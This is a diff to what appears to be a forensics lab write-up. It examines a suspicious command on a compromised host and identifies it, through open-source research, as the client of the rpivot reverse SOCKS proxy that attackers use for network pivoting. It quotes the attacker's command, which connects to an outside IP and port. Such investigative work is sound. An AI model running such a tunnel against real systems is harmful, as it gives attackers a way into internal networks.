@@ -227,7 +227,27 @@ At the Bottom: frequent commands (e.g., `client.py`, `python3`)
 ![gedit](screenshots/gedit_all_www_data2.png)
 >❓ *what is this Python Command `python3 client.py --server-ip 20.106.124.93 --server-port 8889` Doing?*
 
+###🔍 Discovery: Suspicious Python Client Script
+
+The command `python3 client.py --server-ip 20.106.124.93 --server-port 8889`  indicated a potential outbound connection to a remote host. To investigate further, open-source research was conducted.
 ---
+
+### 🌐 Open Source Intelligence (OSINT)
+
+A web search for `client.py --server-ip --server-port` led to the finding of a GitHub repository for `rpivot`.
+
+### 🛠️ Tool Identified: rpivot
+
+**rpivot** is a reverse SOCKS proxy.
+
+It is used by attackers to pivot into internal networks by creating a tunnel from the compromised host to a remote attacker's system.
+
+**Components:**
+- `client.py` — runs on the **victim machine**
+- `server.py` — runs on the **attacker's system**
+
+### 🔎 Filtering for Attacker Activity as www-data
+
 
 ## 🧭 Task 6: Compare with Pre-Intrusion Log
 
